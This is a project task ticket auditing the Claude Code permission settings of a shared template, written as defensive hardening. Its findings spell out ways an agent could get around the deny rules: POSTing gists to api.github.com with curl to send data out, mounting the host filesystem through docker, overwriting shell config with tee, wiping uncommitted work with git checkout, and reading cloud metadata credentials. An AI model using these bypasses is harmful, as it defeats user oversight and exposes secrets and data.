---
schema_version: "1"
uuid: f8a2b3c4-5d6e-7f8a-9b0c-1d2e3f4a5b6c
title: "Permissions audit round 2: CFA Android learnings"
status: complete
priority: medium
type: task
tags: [permissions-audit, security]
created: 2026-04-10
updated: 2026-04-11
parent: null
discovery_source: "CFA Android PR #8093 permissions review session"
session_id: null
lifecycle_phase: complete
lifecycle_slug: permissions-audit-round-2-cfa-android-learnings
complexity: complex
criticality: high
spec: lifecycle/permissions-audit-round-2-cfa-android-learnings/spec.md
areas: []
---

# Permissions audit round 2: CFA Android learnings

## Context

Deep-dive review of CFA Android's Cursor permissions (PR #8093) surfaced patterns that also apply to cortex-command's `claude/settings.json`. The 054-058 epic addressed the highest-severity issues (eval, interpreter escape hatches, exfiltration via gh/WebFetch, Read overly-broad allow). This ticket covers remaining gaps identified by cross-referencing the two configs.

## Guiding principle: optimize for public safety

`claude/settings.json` is deployed as global user settings via `just setup`. Other users who adopt the cortex-command template inherit these defaults without auditing the allow list. They trust that the shipped permissions are safe.

**The template should ship conservative defaults. Power users broaden permissions in `settings.local.json`.**

This is the same principle applied in the 054 epic (see DR-7). Every finding below should be evaluated through this lens: if a user who doesn't understand the tradeoff inherits this permission, is that acceptable? If not, scope it down or move it to the ask tier in the template. The primary owner can always re-add blanket allows locally.

## Findings

### High — Exfiltration via curl to sandbox-allowed domains

`Bash(curl *)` is in the allow list. `api.github.com` is in `sandbox.network.allowedDomains`. The `Bash(gh gist create *)` deny prevents the `gh` CLI from exfiltrating, but `curl -X POST https://api.github.com/gists -d '...'` does the same thing through the allowed network path. The deny rule is bypassed by a different tool hitting the same API.

**Fix options:**
- Remove `api.github.com` from `allowedDomains` (rely on `gh:*` excluded commands for GitHub access)
- Or add `Bash(curl *api.github.com*)` to deny
- Or move `Bash(curl *)` to ask tier

### High — Blanket interpreter-adjacent allows

These commands execute arbitrary code from config files without any deny overrides:

| Command | Risk |
|---------|------|
| `Bash(docker *)` | `docker run -v /:/host` mounts entire filesystem; escapes sandbox |
| `Bash(npm *)` | `npm run <script>` executes arbitrary shell from package.json |
| `Bash(brew *)` | `brew install` modifies system packages |
| `Bash(make *)` | Makefiles execute arbitrary shell commands |
| `Bash(pip3 *)` | Post-install scripts run arbitrary code |

**Fix:** Scope to safe subcommands or move to ask tier. Examples:
- `Bash(docker ps *)`, `Bash(docker logs *)`, `Bash(docker inspect *)` instead of `Bash(docker *)`
- `Bash(npm test *)`, `Bash(npm run test *)`, `Bash(npm run build *)` instead of `Bash(npm *)`
- `Bash(brew list *)`, `Bash(brew info *)`, `Bash(brew search *)` instead of `Bash(brew *)`

### Medium — Edit deny bypass via tee

`Edit(~/.zshrc)` is denied but `Bash(tee *)` is allowed. `tee -a ~/.zshrc` or `tee ~/.bash_profile` appends/overwrites shell config files, achieving the same effect the Edit deny prevents.

**Fix:** Add deny rules:
```
Bash(tee *~/.zshrc*)
Bash(tee *~/.bashrc*)
Bash(tee *~/.bash_profile*)
Bash(tee *~/.zprofile*)
```

### Medium — git checkout -- discards changes (same as git restore)

`Bash(git checkout *)` is in allow. `Bash(git restore *)` is in ask. But `git checkout -- .` does the same destructive thing as `git restore .` — silently discards all uncommitted changes with no recovery.

**Fix:** Add `Bash(git checkout -- *)` to ask or deny tier.

### Low — Missing cloud metadata endpoint deny

`WebFetch(domain:169.254.169.254)` is not denied. This is the AWS/GCP instance metadata endpoint. If this machine ever runs in a cloud context, the AI could query instance metadata for IAM credentials.

**Fix:** Add `WebFetch(domain:169.254.169.254)` to deny.

## Out of scope

- Read/Bash bypass (cat * reads files that Read deny rules block) — acknowledged as a fundamental limitation in the 054 research. No clean fix without removing cat/grep from allow.
- Sandbox filesystem read scope — depends on Claude Code sandbox implementation, not configurable via permissions.

## Acceptance criteria

- Each finding investigated and consciously accepted or fixed
- Blanket allows for docker/npm/brew/make/pip3 either scoped to safe subcommands or moved to ask tier in the shared template
- Power-user overrides documented in a comment or companion file so adopters know what they can add to `settings.local.json`
- No regression in interactive or overnight workflows
